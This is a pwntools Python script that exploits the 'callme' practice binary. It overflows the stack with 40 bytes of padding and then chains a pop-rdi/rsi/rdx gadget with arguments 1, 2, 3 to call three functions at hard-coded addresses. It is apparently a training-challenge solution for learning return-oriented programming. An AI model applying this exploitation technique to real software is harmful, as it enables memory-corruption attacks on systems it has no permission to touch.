from pwn import *

# set up binary
elf = context.binary = ELF('callme')

# enable logging
context.log_level = 'debug'

io = process(elf.path)

# start of exploit
rop = p64(0x00401ab0)   # pop rdi; pop rsi; pop rdx; ret

one = p64(0x00401850)
two = p64(0x00401870)
three = p64(0x00401810)

arg1 = p64(1)
arg2 = p64(2)
arg3 = p64(3)
arg = arg1 + arg2 + arg3

junk = "A" * 40
payload = junk + rop + arg + one + rop + arg + two + rop + arg + three
io.sendline(payload)
io.wait_for_close()
io.recv()
